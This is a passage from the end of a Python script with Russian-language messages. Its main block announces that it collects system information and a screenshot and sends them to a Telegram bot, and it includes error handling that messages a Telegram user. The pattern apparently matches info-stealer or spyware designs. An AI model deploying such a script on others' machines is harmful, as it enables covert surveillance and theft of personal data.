        traceback.print_exc()
        
        try:
            bot.send_message(USER_ID, f"❌ Произошла ошибка: {error_msg}")
        except:
            pass
            
        return False

if __name__ == "__main__":
    print("Сбор информации о системе и создание скриншота...")
    send_info_to_telegram()
    print("Данные успешно отправлены в Telegram.")
